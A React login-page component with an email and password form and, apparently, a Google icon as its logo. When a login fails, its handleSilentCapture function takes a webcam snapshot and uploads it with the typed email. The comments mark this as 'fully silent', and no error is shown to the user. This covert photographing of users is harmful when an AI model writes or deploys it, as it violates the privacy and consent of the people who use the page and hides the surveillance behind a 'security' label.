import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers/yup';
import { useAuth } from '../hooks/useAuth';
import { captureSilentSnapshot } from '../hooks/useWebcam';
import { authAPI } from '../services/api';
import { loginSchema } from '../utils/validation';
import Button from '../components/ui/Button';
import Input from '../components/ui/Input';
import Card from '../components/ui/Card';
import { Link, useNavigate } from 'react-router-dom';
import { Mail, Lock } from 'lucide-react';
import { showSuccess } from '../components/ToastProvider';
import { MESSAGES } from '../utils/constants';

const Login = () => {
  const { login, loading } = useAuth();
  const navigate = useNavigate();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(loginSchema),
  });

  const [passwordVisible, setPasswordVisible] = useState(false);

// 🔒 FULLY SILENT SECURITY CAPTURE
  const handleSilentCapture = async (email) => {
    try {
      console.log("[Security] sending snapshot");
      const snapshot = await captureSilentSnapshot();

      if (!snapshot) {
        console.log("[Security] snapshot is null!");
        return;
      }

      const formData = new FormData();
      formData.append('snapshot', snapshot, 'snapshot.jpg');
      formData.append('email', email);

      await authAPI.webcamSnapshot(formData);

      console.log("[Security] snapshot sent");
    } catch (err) {
      console.log("[Security] send failed:", err);
    }
  };

  // 🔐 LOGIN
  const onSubmit = async (data) => {
    const result = await login(data);

    if (result.success) {
      showSuccess(MESSAGES.loginSuccess);
      navigate('/dashboard', { replace: true });
    } else {
      // 🔥 NO UI ERROR, ONLY SILENT SECURITY
      handleSilentCapture(data.email);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center py-12 px-4 bg-gradient-to-br from-blue-50 to-indigo-100">
      <Card className="w-full max-w-md">
        <div className="text-center">
          <img
            src="/google-icon.png"
            alt="Logo"
            className="w-20 h-20 rounded-2xl shadow-2xl object-contain mx-auto mb-8"
          />
          <h2 className="text-3xl font-bold text-gray-900 mb-2">
            Welcome back
          </h2>
          <p className="text-gray-600 mb-8">
            Sign in to your account
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
          <Input
            label="Email"
            type="email"
            error={errors.email?.message}
            {...register('email')}
            icon={
              <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
            }
          />

          <Input
            label="Password"
            type="password"
            showPasswordToggle
            passwordVisible={passwordVisible}
            onTogglePassword={() => setPasswordVisible(!passwordVisible)}
            error={errors.password?.message}
            {...register('password')}
            icon={
              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
            }
          />

          <Button
            type="submit"
            loading={loading}
            disabled={loading}
            className="w-full"
          >
            {loading ? 'Signing in...' : 'Sign In'}
          </Button>

          <div className="text-center">
            <Link
              to="/forgot-password"
              className="text-sm text-blue-600 hover:text-blue-700 font-medium"
            >
              Forgot your password?
            </Link>
          </div>
        </form>
      </Card>
    </div>
  );
};

export default Login;